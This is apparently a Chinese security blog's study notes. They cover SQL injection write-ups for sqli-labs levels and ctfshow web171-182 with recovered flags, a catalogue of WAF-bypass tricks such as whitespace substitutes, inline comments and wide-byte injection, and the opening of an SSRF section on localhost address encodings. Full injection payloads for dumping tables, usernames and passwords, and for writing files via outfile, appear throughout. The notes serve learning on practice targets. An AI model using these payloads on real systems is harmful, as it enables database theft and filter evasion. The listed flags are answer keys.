<h1>二</h1>
<p>这里的步骤与第一关相同，只不过注入方式变成了数字型注入</p>
<p>当我们传入?id=1’时发现他进行了报错，说明这里是数字型注入，字符型注入需要’进行闭环</p>
<p>?id=1 order by 3<br>
?id=-1 union select 1,2,3<br>
?id=-1 union select 1,database(),version()<br>
?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=‘security’<br>
?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=‘users’<br>
?id=-1 union select 1,2,group_concat(username ,id , password) from users</p>
<h1>三</h1>
<p>当我们查看是那种注入时，发现字符型会报错，报错后面的内容当中有一个反括号</p>
<p>所以这里我们既需要单引号，又需要反括号</p>
<p>?id=1’) order by 3–+<br>
?id=-1’) union select 1,2,3–+<br>
?id=-1’) union select 1,database(),version()–+<br>
?id=-1’) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=‘security’–+<br>
?id=-1’) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=‘users’–+<br>
?id=-1’) union select 1,2,group_concat(username ,id , password) from users–+</p>
<h1>四</h1>
<p>双引号和反括号</p>
<p>?id=1&quot;) order by 3–+<br>
?id=-1&quot;) union select 1,2,3–+<br>
?id=-1&quot;) union select 1,database(),version()–+<br>
?id=-1&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=‘security’–+<br>
?id=-1&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=‘users’–+<br>
?id=-1&quot;) union select 1,2,group_concat(username ,id , password) from users–+</p>
<h2 id="一到四用的是联合注入，但是联合注入需要有回显">一到四用的是联合注入，但是联合注入需要有回显</h2>
<h1>五</h1>
<p>第五道题只有对错回显，要用到布尔盲注。布尔盲注主要用到length(),ascii() ,substr()，首先通过length()函数确定长度再通过另外两个确定具体字符是什么</p>
<p>?id=1’ and length(database())=8–+</p>
<p>我们知道?id=1是有回显的，那么我们用逻辑运算and，and之前肯定是true，and后面的东西就是我们要测试的了。</p>
<p>大于号可以换成小于号或者等于号，主要是判断数据库的长度。lenfth()是获取当前数据库名的长度。如果数据库是haha那么length()就是4</p>
<p><code>select database()</code>：这是一个 SQL 语句，用于获取当前正在使用的数据库名称。</p>
<p>substr(“78909”,1,1)=7 substr(a,b,c)a是要截取的字符串，b是截取的位置，c是截取的长度。布尔盲注我们都是长度为1因为我们要一个个判断字符。ascii()是将截取的字符转换成对应的ascii码，这样我们可以很好确定数字根据数字找到对应的字符。b站有视频解析方法</p>
<p>?id=1’ and substr(database(),1,8)=‘security’–+</p>
<h2 id="补充一下mysql当中的函数">补充一下mysql当中的函数</h2>
<p>concat()	将多个字符串连接成一个字符串</p>
<h3 id="concat-str1-str2-…">concat(str1,str2,…)</h3>
<p>返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT CONCAT(&#x27;张三&#x27;,&#x27;李四&#x27;,&#x27;王五&#x27;);</span><br><span class="line">result&gt; 张三李四王五</span><br><span class="line">//——————————————————————————————————————————————</span><br><span class="line">mysql&gt; SELECT CONCAT(&#x27;张三&#x27;,&#x27;李四&#x27;,NULL);</span><br><span class="line">result&gt; NUll</span><br></pre></td></tr></table></figure>
<h3 id="concat-ws">concat_ws()</h3>
<p>和concat()一样，将多个字符串连接成一个字符串，但是可以一次性指定分隔符～（concat_ws就是concat with separator）</p>
<p>concat_ws(separator,str1,str2,…)</p>
<p>说明：第一个参数指定分隔符。需要注意的是分隔符不能为null，如果为null，则返回结果为null。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//默认分隔符为逗号</span><br><span class="line">mysql&gt; SELECT CONCAT_WS(&#x27;,&#x27;,&#x27;张三&#x27;,&#x27;李四&#x27;,&#x27;王五&#x27;);</span><br><span class="line">result&gt; 张三,李四,王五</span><br><span class="line">//和MySQL中CONCAT函数不同的是, CONCAT_WS函数在执行的时候,不会因为NULL值而返回NULL </span><br><span class="line">mysql&gt; SELECT CONCAT_WS(&#x27;,&#x27;,&#x27;张三&#x27;,NULL,&#x27;王五&#x27;);</span><br><span class="line">result&gt; 张三,王五</span><br></pre></td></tr></table></figure>
<h3 id="group-concat">group_concat()</h3>
<p>将group by产生的同一个分组中的值连接起来，返回一个字符串结果。</p>
<p>group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc ] [separator ‘分隔符’] )</p>
<p>这里用<strong>报错注入</strong></p>
<p>常用报错函数</p>
<ul>
<li>updatexml() 是mysql对xml文档数据进行查询和修改的xpath函数</li>
<li>extractvalue() 是mysql对xml文档数据进行查询的xpath函数</li>
<li>floor() mysql中用来取整的函数</li>
<li>exp() 此函数返回e(自然对数的底)指数X的幂值</li>
</ul>
<p>updatexml报错注入–常用</p>
<p><strong>原理</strong>：updatexml()函数实际上是去更新了XML文档，但是我们在xml文档路径的位置里面写入了子查询，我们输入特殊字符，然后就因为不符合输入规则然后报错了，但是报错的时候它其实已经执行了那个子查询代码。</p>
<p><strong>updatexml</strong>(xml_doument,XPath_string,new_value)<br>
第一个参数：XML的内容<br>
第二个参数：是需要update的位置XPATH路径<br>
第三个参数：是更新后的内容<br>
所以第一和第三个参数可以随便写，只需要利用第二个参数，他会校验你输入的内容是否符合XPATH格式。</p>
<p>输入内容不符合xpath语法就报错了，我们注入利用的就是这一点</p>
<p>?id=1</p>
<p>?id=1’</p>
<p>?id=1’ order by 4–+</p>
<p>?id=1’ and updatexml(1,concat(0x3e,database(),‘&lt;’),1)–+</p>
<p>?id=1’ and updatexml(1,concat(0x3e,(select group_concat(table_name) from information_schema.tables where table_schema=‘security’),0x3e),1)–+</p>
<p>使用updatexml函数，达成报错注入的前提</p>
<p>用concat拼接内容</p>
<p>?id=1’ and updatexml(1,concat(‘&gt;’,(select group_concat(column_name) from information_schema.columns where table_schema=‘security’ and table_name=‘users’),‘&lt;’),1)–+</p>
<p>这里用逻辑and打开users，如果像之前那样就打不开，好像使用逻辑and是完整的句子</p>
<p>?id=1’ and updatexml(1,concat(‘&gt;’,(select group_concat(password) from users),‘&lt;’),1)–+</p>
<p>或者</p>
<p>?id=1’ and updatexml(1,concat(‘&gt;’,(select password from users limit 1,1),‘&lt;’),1)–+</p>
<p>使用limit的原因是返回的结果超过一行：Subquery returns more than 1 row</p>
<h1>六</h1>
<p>道理同五</p>
<p>?id=1</p>
<p>?id=1&quot;</p>
<p>?id=3&quot; order by 3–+</p>
<p>?id=1&quot; and updatexml(1,concat(‘&gt;’,(select group_concat(table_name) from information_schema.tables where table_schema=‘security’ ),‘&lt;’),1) --+</p>
<p>?id=1&quot; and updatexml(1,concat(‘&gt;’,(select group_concat(column_name) from information_schema.columns where table_schema=‘security’ and table_name=‘users’),‘&lt;’),1) --+</p>
<p>?id=1&quot; and updatexml(1,concat(‘&gt;’,(select password from users limit 0,1),‘&lt;’),1) --+</p>
<h1>七</h1>
<p>正确返回You are in… Use outfile…</p>
<p>错误返回You have an error in your SQL syntax</p>
<p>?id=1’–+</p>
<p>返回错误，说明是有’</p>
<p>接下来看括号</p>
<p>?id=1’)) --+</p>
<p>传入两个反括号时回显正常</p>
<p>这一关布尔盲注仍然可以使用</p>
<p>这里使用导出文件</p>
<h2 id="1-导出文件就是可以向服务器写入文件-但是利用的时候要知道数据库-网站的路径">1.导出文件就是可以向服务器写入文件,但是利用的时候要知道数据库,网站的路径</h2>
<p>因为这一关无法拿到回显，所以就无法拿到路径</p>
<p>我们可以去第一关拿到路径</p>
<p><strong>@@datadir</strong>获取数据库存储数据路径 ，<strong>@@basedir</strong>是MYSQL获取安装路径</p>
<p><a href="http://127.0.0.1/sqli-labs-master/Less-1/?id=-1">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1</a>’ union select 1,2,@@datadir --+</p>
<p>D:\phpstudy\phpstudy_pro\Extensions\MySQL5.7.26\data\</p>
<p>@@datadir返回的是数据库存储数据的路径，而我们知道网站路径是在WWW目录下</p>
<p>结合@@datadir我们可以推断出网站的绝对路径为</p>
<p>D:\phpstudy\www\</p>
<h2 id="2-读写权限测试">2.读写权限测试</h2>
<p>id=1’)) and (select count(*) from mysql.user)&gt;0 --+</p>
<p>如果返回正常则有读取权限</p>
<h1>web171</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;select username,password from user where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[&#x27;id&#x27;].&quot;&#x27; limit 1;&quot;;</span><br></pre></td></tr></table></figure>
<p>我们填进去的东西是&quot;.$_GET[‘id’].&quot;这一部分。</p>
<p>我们查看一下所有的东西，总共有24个</p>
<p>那我们传进去999’ or id='25</p>
<p>发现什么都没有，那id是不是不是25？</p>
<p>999’ or id='26</p>
<p>ctfshow{8d8e3e69-a372-4436-a1dc-2466b32ce185}</p>
<p>或者1’or '1=1全部爆出来</p>
<h1>web172</h1>
<p>上题方法不行，用正常方法</p>
<p>1’ union select database(),group_concat(table_name),3 from information_schema.tables where table_schema=‘ctfshow_web’–+</p>
<p>发现有一个ctfshow_user2那么flag应该在这里面</p>
<p>1’ union select database(),2,group_concat(column_name) from information_schema.columns where table_name=‘ctfshow_user2’–+</p>
<p>1’ union select database(),2,group_concat(id,username,password) from ctfshow_user2–+</p>
<p>ctfshow{00ab3cb2-1760-47d6-9e65-692165dcf191}</p>
<h1>web173</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//检查结果是否有flag</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>)))&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br></pre></td></tr></table></figure>
<p>由此可知，返回结果当作不应该出现flag字样，我们只把后面的username去掉就可以了</p>
<p>1’ union select database(),group_concat(table_name),3 from information_schema.tables where table_schema=‘ctfshow_web’–+</p>
<p>发现有一个ctfshow_user3那么flag应该在这里面</p>
<p>1’ union select database(),2,group_concat(column_name) from information_schema.columns where table_name=‘ctfshow_user3’–+</p>
<p>1’ union select database(),2,group_concat(id,password) from ctfshow_user3–+</p>
<p>ctfshow{d79f6a15-c491-4716-b31e-0c15a6e05643}</p>
<h1>web174</h1>
<p>返回结果当中不能有flag字样和数字</p>
<p>用replace替换返回flag结果当中的数字</p>
<p>to_base64(password)</p>
<p>-1’ union select  replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(password),2,‘testb’) ,3,‘testc’) ,4,‘testd’) ,5,‘teste’) ,6,‘testf’) ,7,‘testg’) ,8,‘testh’) ,9,‘testi’) ,0,‘testj’) ,1,‘testa’),replace(1,‘1’,‘testa’) from ctfshow_user4 where username=‘flag’–+</p>
<p>YtestcRmctestbhvdtestctmOWJlNmIyNytestjzODIyLTQyNjgtOTZkNytestjtestdZmEyOWMtestbMDFmYThtesti</p>
<p>Y3Rmc2hvd3tmOWJlNmIyNy0zODIyLTQyNjgtOTZkNy04ZmEyOWM2MDFmYTh9</p>
<p>ctfshow{f9be6b27-3822-4268-96d7-8fa29c601fa8}</p>
<h1>web175</h1>
<h2 id="x00-x7f-的含义"><strong><code>[\x00-\x7f]</code> 的含义</strong></h2>
<ul>
<li>
<p><code>\x00</code> 代表 <strong>ASCII 码 0（空字符 <code>NULL</code>）</strong></p>
</li>
<li>
<p><code>\x7f</code> 代表 <strong>ASCII 码 127（<code>DEL</code> 控制字符）</strong></p>
</li>
<li>
<pre><code>[\x00-\x7f]
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">   表示匹配 </span><br><span class="line"></span><br><span class="line">  所有 ASCII 码 0-127 之间的字符</span><br><span class="line"></span><br><span class="line">  - 包括 **英文字符、数字、符号** 以及 **控制字符**</span><br><span class="line">  - **不包括** 非 ASCII 字符（如中文、日文、韩文、特殊符号）</span><br><span class="line"></span><br><span class="line">将数据输出到一个文件中，然后访问对应文件</span><br><span class="line"></span><br><span class="line">-1&#x27; union select  username,password from ctfshow_user5 into outfile &quot;/var/www/html/1.txt&quot;--+</span><br><span class="line"></span><br><span class="line">ctfshow&#123;90c0a2ed-2a6a-45ac-b6f4-5c61812ca570&#125;</span><br><span class="line"></span><br><span class="line"># web176</span><br><span class="line"></span><br><span class="line">1&#x27; or 1=1--+</span><br><span class="line"></span><br><span class="line">ctfshow&#123;0d0d29c4-c17c-4a12-b294-574bbca66f31&#125;</span><br><span class="line"></span><br><span class="line"># web177</span><br><span class="line"></span><br><span class="line">这里通过自行测试过滤了空格，可以用/**/代替</span><br><span class="line"></span><br><span class="line">1&#x27;or/**/1=1%23</span><br><span class="line"></span><br><span class="line">%23是#</span><br><span class="line"></span><br><span class="line">ctfshow&#123;405ab7d6-0176-4a2b-b7c5-320dd8b32529&#125;</span><br><span class="line"></span><br><span class="line"># web178</span><br><span class="line"></span><br><span class="line">这里似乎是过滤了空格，我这里用%09代替</span><br><span class="line"></span><br><span class="line">1&#x27;%09union%09select%091,database(),group_concat(password)%09from%09ctfshow_user%23</span><br><span class="line"></span><br><span class="line">或者1&#x27;%09or%091=1%23一下拿到</span><br><span class="line"></span><br><span class="line">ctfshow&#123;a448625d-1474-4b15-90b7-8cd2d315ae54&#125;</span><br><span class="line"></span><br><span class="line"># web179</span><br><span class="line"></span><br><span class="line">这里还%09过滤了，%0c可以</span><br><span class="line"></span><br><span class="line">1&#x27;%0cor%0c1=1%23</span><br><span class="line"></span><br><span class="line">ctfshow&#123;73c4dc08-b1df-4e9f-b961-07c022c22454&#125;</span><br><span class="line"></span><br><span class="line"># web180</span><br><span class="line"></span><br><span class="line">id=-1&#x27;or(id=26)and&#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">```sql</span><br><span class="line">SELECT id, username, password </span><br><span class="line">FROM ctfshow_user </span><br><span class="line">WHERE username != &#x27;flag&#x27; </span><br><span class="line">AND id = &#x27;-1&#x27; OR (id=26) AND &#x27;1&#x27;=&#x27;1&#x27; </span><br><span class="line">LIMIT 1;</span><br></pre></td></tr></table></figure>

</code></pre>
</li>
</ul>
<p><code>id=26</code> 如果有数据，则 <code>(id=26) AND ('1'='1')</code> 为 <code>TRUE</code>。</p>
<p>ctfshow{07b73d20-9062-43c3-8cae-1c4d53f793e5}</p>
<h1>web181</h1>
<p>同180</p>
<h1>web182</h1>
<p>同180</p>
]]></content>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入绕过</title>
    <url>/2025/04/14/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<p>空格绕过、引号绕过、逗号绕过、比较符号绕过、or和and绕过、注释绕过、等号绕过、关键字union_select_where绕过、通用绕过、等价函数绕过、宽字节注入。</p>
<h2 id="空格绕过">空格绕过</h2>
<p><code>+</code>（加号，尤其是URL中）</p>
<p><code>%09</code>（URL编码的制表符，Tab）</p>
<p><code>%0a</code>（换行符\n）</p>
<p><code>%0b</code>（垂直制表符）</p>
<p><code>%0c</code>（换页符）</p>
<p><code>%0d</code>（回车符）</p>
<p><code>/**/</code> (多行注释)</p>
<p><code>()</code> (括号)在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p>
<p>时间time based盲注当中常见括号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23</span><br></pre></td></tr></table></figure>
<h2 id="引号绕过">引号绕过</h2>
<p>十六进制绕过引号 	eg：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&quot;user&quot;--+</span><br></pre></td></tr></table></figure>
<p>我们避免不了使用引号，使用十六进制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x75736572--+</span><br></pre></td></tr></table></figure>
<p>为什么可以使用十六进制？<br>
<strong>MySQL能识别十六进制编码</strong>，因为<strong>在MySQL里，十六进制字面量</strong>（像<code>0x75736572</code>）<strong>是合法的表达式</strong>，而且<strong>可以直接当作字符串或者数字使用</strong>。</p>
<h2 id="逗号绕过">逗号绕过</h2>
<p>使用盲注Blind的时候会用到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">substr(str, start, length)</span><br><span class="line"></span><br><span class="line">mid(str, start, length)</span><br></pre></td></tr></table></figure>
<p>这两个函数，他们都会用到逗号	eg：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users where id=1 and ascii(substr(database(),0,1))&gt;64</span><br><span class="line"></span><br><span class="line">select substr(database(), 0, 1);</span><br><span class="line">select mid(database(), 0, 1);</span><br></pre></td></tr></table></figure>
<p>我们可以用from for</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select substr(database() from 1 for 1);</span><br><span class="line">select mid(database() from 1 for 1);</span><br></pre></td></tr></table></figure>
<p>为什么？</p>
<p>MySQL设计<code>substr()</code>和<code>mid()</code>的时候就规定了<strong>两种语法</strong>。</p>
<p>​	<code>	substr(str, pos, len)</code>是标准SQL。</p>
<p>​	<code>substr(str from pos for len)</code>是<strong>MySQL兼容</strong>的另一种写法。</p>
<p>补充:</p>
<p>1.limit也会用到逗号	eg：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LIMIT 0,1</span><br></pre></td></tr></table></figure>
<p>用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LIMIT 1 OFFSET 0</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LIMIT start, length</span><br><span class="line">LIMIT start OFFSET length</span><br><span class="line"></span><br><span class="line">SELECT * FROM users LIMIT 5;</span><br><span class="line">取最前面 5 条记录。</span><br><span class="line"></span><br><span class="line">SELECT * FROM users LIMIT 5 OFFSET 10;</span><br><span class="line">跳过前面 10 条记录，然后取 5 条。</span><br><span class="line"></span><br><span class="line">LIMIT 5 OFFSET 10</span><br><span class="line">等价于limit 10，5</span><br></pre></td></tr></table></figure>
<p>2.substr(str FROM start FOR length)	eg：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">substr(database() from 1 for 1)</span><br><span class="line">从 database() 结果的第 1 个字符开始，取1个字符。</span><br></pre></td></tr></table></figure>
<p>我们可以使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">substr(database(from1for1));</span><br><span class="line">和</span><br><span class="line">substr(database(0from1for1));</span><br><span class="line">其中0可以忽略，相当于填充/绕过</span><br><span class="line">有些WAF拦关键字 from，但是遇到 0from 就不认识了，可以轻微绕过。</span><br></pre></td></tr></table></figure>
<h2 id="比较符号绕过">比较符号绕过</h2>
<p>盲注时可能会用到二分法查找，这时候我们需要用到大小于号	eg：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users where id=1 and ascii(substr(database(),0,1))&gt;64</span><br></pre></td></tr></table></figure>
<p>此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select*fromuserswhereid=1and greatest(ascii(substr(database(),0,1)),64)=64</span><br></pre></td></tr></table></figure>
<h2 id="or-and-绕过">or and 绕过</h2>
<p>and=&amp;&amp; or=||</p>
<h2 id="注释绕过">注释绕过</h2>
<p>一般我们的SQL注入最后要加注释符（<code>--+</code> / <code>#</code>）来注释掉原SQL尾巴，但是注释被waf了，怎么办？</p>
<p>1.补齐语法，骗过后半部分</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原本</span><br><span class="line">select * from users where id=&#x27;$id&#x27; and status=&#x27;1&#x27;</span><br><span class="line">注入</span><br><span class="line">1&#x27; and 1=1 and &#x27;1&#x27;=&#x27;1</span><br><span class="line">拼接起来就是</span><br><span class="line">select * from users where id=&#x27;1&#x27; and 1=1 and &#x27;1&#x27;=&#x27;1&#x27; and status=&#x27;1&#x27;</span><br><span class="line"></span><br><span class="line">在你的payload最后补一个&#x27;或&quot;,让整个SQL闭合；</span><br><span class="line">然后正常继续后面的SQL，避免错误。</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>利用括号包住注入</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注入</span><br><span class="line">?id=1&#x27;) and (1=1) and (&#x27;1&#x27;=&#x27;1</span><br><span class="line">拼接起来就是</span><br><span class="line">select * from users where id=&#x27;1&#x27;) and (1=1) and (&#x27;1&#x27;=&#x27;1&#x27; and status=&#x27;1&#x27;</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>用逻辑分隔符 <code>OR</code> / <code>AND</code> 尾部自然结束</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注入</span><br><span class="line">?id=1&#x27; or 1=1 or &#x27;1&#x27;=&#x27;2</span><br><span class="line">拼接</span><br><span class="line">select * from users where id=&#x27;1&#x27; or 1=1 or &#x27;1&#x27;=&#x27;2&#x27; and status=&#x27;1&#x27;</span><br></pre></td></tr></table></figure>
<h2 id="等于号绕过">等于号绕过</h2>
<p>关键是：like或者大小于号</p>
<table>
<thead>
<tr>
<th>技巧</th>
<th>示例</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>1. <code>&lt;=&gt;</code>（空安全等号）</td>
<td><code>1&lt;=&gt;1</code></td>
<td><code>&lt;=&gt;</code> 是MySQL的“安全等于”，跟<code>=</code>作用一模一样！</td>
</tr>
<tr>
<td>2. <code>like</code>代替<code>=</code></td>
<td><code>username like 'admin'</code></td>
<td><code>like</code> 代替比较，效果一样</td>
</tr>
<tr>
<td>3. <code>regexp</code>代替</td>
<td><code>username regexp 'admin'</code></td>
<td>用正则匹配代替比较</td>
</tr>
<tr>
<td>4. <code>between</code>代替</td>
<td><code>1 between 1 and 1</code></td>
<td><code>between a and b</code> 其实就是 a &lt;= x &lt;= b</td>
</tr>
<tr>
<td>5. <code>instr()</code>函数</td>
<td><code>instr(database(),'ctf')&gt;0</code></td>
<td><code>instr</code>返回字符串位置，结果&gt;0表示包含</td>
</tr>
<tr>
<td>6. <code>strcmp()</code>函数</td>
<td><code>strcmp('admin',username)=0</code></td>
<td>相等返回0，绕过直接比较</td>
</tr>
<tr>
<td>7. <code>case when then</code>逻辑</td>
<td><code>case when 1 then 1 else 2 end</code></td>
<td>条件判断，等于的时候返回</td>
</tr>
</tbody>
</table>
<h2 id="union、select、where绕过">union、select、where绕过</h2>
<p>1.注释绕过</p>
<p>//，-- , /**/, #, --+, – -, ;,%00,–a</p>
<p>U/**/NION</p>
<p>2.大小写绕过</p>
<p>UNioN</p>
<p>3.内联注释绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*!UnIoN*/</span><br></pre></td></tr></table></figure>
<p><code>/*!*/</code> 是一种<strong>版本注释</strong>，只有<strong>MySQL 5.0以上版本</strong>会执行被注释的内容。</p>
<p><strong>MySQL 5.0以下的版本会忽略注释内容</strong>，所以这种注释写法主要是为了绕过WAF和进行兼容性测试。</p>
<p><strong>绕过过滤机制</strong>：许多WAF和防火墙会拦截常见的SQL关键字，比如 <code>SELECT</code>、<code>UNION</code>、<code>INSERT</code>等。如果你把这些关键字包裹在 <code>/*!50000SELECT*/</code> 这样的版本注释中，<strong>WAF不会识别注释内容为关键字</strong>，因此会允许通过。</p>
<p><strong>版本特性</strong>：<code>/*!*/</code> 的版本注释会在MySQL <strong>5.0及以上版本执行</strong>。例如，<code>/*!50000SELECT*/</code> 只有MySQL 5.0及以上的版本会执行，而<strong>MySQL 5.0以下的版本会忽略这个注释内容</strong>，这样就可以利用版本控制来选择是否执行某些SQL语句。</p>
<p>4.双写绕过</p>
<p>ununionion</p>
<h2 id="通用绕过">通用绕过</h2>
<p>URLEncode<strong>编码</strong>，ASCII,HEX,unicode编码绕过</p>
<p>有时WAF会过滤常见的 <code>SELECT</code> 或 <code>UNION</code>，我们可以使用<strong>子查询</strong>来绕过。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and (select 1 from users where username=&#x27;admin&#x27;)--</span><br></pre></td></tr></table></figure>
<p>这通过子查询来避免了 <code>UNION</code> 的使用。</p>
<h2 id="等价函数绕过">等价函数绕过</h2>
<p>hex()、bin()==&gt;ascii()</p>
<p>sleep()==&gt;benchmark()</p>
<p>concat_ws()==&gt;group_concat()</p>
<p>mid()、substr()==&gt;substring() @@user==&gt;user() @@datadir==&gt;datadir()</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">举例：</span><br><span class="line">substring()和substr()无法使用时：</span><br><span class="line">?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74</span><br><span class="line">或者：</span><br><span class="line">substr((select&#x27;password&#x27;),1,1)=0x70strcmp(left(&#x27;password&#x27;,1),0x69)=1strcmp(left(&#x27;password&#x27;,1),0x70)=0strcmp(left(&#x27;password&#x27;,1),0x71)=-1</span><br></pre></td></tr></table></figure>
<h2 id="宽字节注入">宽字节注入</h2>
<p>先了解一下waf原理：<br>
waf会把引号进行转义例如我们传入的单引号会被变成反斜杠加一个单引号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;  ====&gt;  \&#x27;</span><br></pre></td></tr></table></figure>
<p>这时我们就要用到宽字节注入了(通俗来讲就是把他的反斜杠给变成其他东西)</p>
<p>宽字节注入出现的条件：<strong>多字节编码环境下</strong>（特别是 <strong>GBK、GB2312、Big5</strong> 这些中文编码）</p>
<p>举个简单的例子：</p>
<ul>
<li>正常情况下，我们输入：<code>'</code></li>
<li>服务器可能会过滤或转义 <code>'</code>，防止注入。</li>
</ul>
<p>但是！如果服务器是 <strong>GBK编码</strong>，而我们提交的 <code>'</code> 后面跟了一个 <strong>0xBF</strong> 这样的字节（GBK里合法的第二字节范围是 0x40~0xFE），<strong>数据库就会把它们一起当成一个&quot;中文字符&quot;来处理</strong>，不会单独识别 <code>'</code>。</p>
<p>于是：</p>
<ul>
<li><code>' + 0xbf</code> → 被解析为一个合法的GBK字符</li>
<li>引号 <code>'</code> <strong>就失效了！</strong></li>
<li>后面你就可以接着注入任意SQL代码了。</li>
</ul>
<p>关键就是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%bf&#x27;、%df&#x27;、%ff&#x27;</span><br></pre></td></tr></table></figure>
<p>%bf和反斜杠结合会变成中文，然后会把单引号给露出来。</p>
<p>当我们发现我们的sql语句当中任何闭合符号都不行，就需要采用宽字节注入来进行闭合了</p>
]]></content>
      <tags>
        <tag>sql注入绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>SSRF</title>
    <url>/2025/04/20/ssrf/</url>
    <content><![CDATA[<h1>ssrf漏洞介绍</h1>
<p>我们可以通过外网连到服务器。服务器可以访问内部网络。</p>
<p>我们可以通过外网以服务器为媒介访问内部网络。</p>
<h2 id="漏洞出现原因">漏洞出现原因</h2>
<p>服务器使用了php的curl模块，并且没有合理的waf。</p>
<h2 id="获取flag的规则">获取flag的规则</h2>
<p>ssrf结合其他协议来实现获取flag</p>
<p>常用的协议有：<br>
file、dict、gopher和ftp等。</p>
<p><a href="https://www.cnblogs.com/CoLo/p/14214208.html">SSRF与dict协议</a></p>
<p><a href="https://blog.csdn.net/qq_50854662/article/details/129180268">SSRF漏洞与Gopher协议</a></p>
<p><a href="https://blog.csdn.net/why811/article/details/133749036">SSRF与ftp</a></p>
<h2 id="绕过">绕过</h2>
<h3 id="等价替换">等价替换</h3>
<p><code>127.0.0.1</code>==<code>localhost</code>==<code>0.0.0.0</code>==<code>0</code>==<code>127.127.127.127</code>==<code>0x7F.0.0.1</code>==<code>0177.0.0.1</code>==<code>2130706433</code>==<code>0x7F000001</code>==<code>127.1</code>==<code>127。0。0。1</code>==`127.0.0.任意数字</p>
<h3 id="利用Enclosed-alphanumerics">利用Enclosed alphanumerics</h3>
